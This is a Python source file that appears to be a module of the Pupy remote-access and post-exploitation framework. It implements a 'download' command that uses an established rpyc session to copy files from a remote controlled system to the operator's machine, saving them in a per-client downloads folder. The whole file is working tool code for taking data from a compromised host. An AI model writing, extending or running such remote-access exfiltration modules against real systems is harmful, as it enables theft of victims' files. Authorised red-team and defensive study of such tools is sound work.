# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.PupyConfig import PupyConfig
from rpyc.utils.classic import download
import os
import os.path
import time

__class_name__="DownloaderScript"

@config(category="manage")
class DownloaderScript(PupyModule):
    """ download a file/directory from a remote system """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='download', description=self.__doc__)
        self.arg_parser.add_argument('remote_file', metavar='<remote_path>')
        self.arg_parser.add_argument('local_file', nargs='?', metavar='<local_path>', completer=path_completer)

    def run(self, args):
        ros = self.client.conn.modules['os']
        remote_file = ros.path.expandvars(args.remote_file)

        if args.local_file:
            local_file = os.path.expandvars(args.local_file)

            if os.path.isdir(local_file):
                local_file = os.path.join(local_file, ros.path.basename(remote_file))
        else:
            config = PupyConfig()
            filesdir = config.get_folder('downloads', {'%c': self.client.short_name()})
            remote_file_basename = ros.path.basename(remote_file)
            local_file = os.path.join(filesdir, remote_file_basename)

        local_dir = os.path.dirname(local_file)
        if not os.path.exists(local_dir):
            os.makedirs(local_dir)

        self.info('downloading %s ...'%remote_file)
        start_time = time.time()
        size = ros.path.getsize(remote_file)
        download(self.client.conn, remote_file, local_file, chunk_size=min(size, 8*1024*1024))
        self.success('file downloaded from remote:%s to local:%s'%(remote_file, local_file))
        total_time=round(time.time()-start_time, 2)
        self.info(
            '%s bytes downloaded in: %ss. average %sKB/s'%(
                size, total_time, round((size/total_time)/10**3, 2)
            )
        )
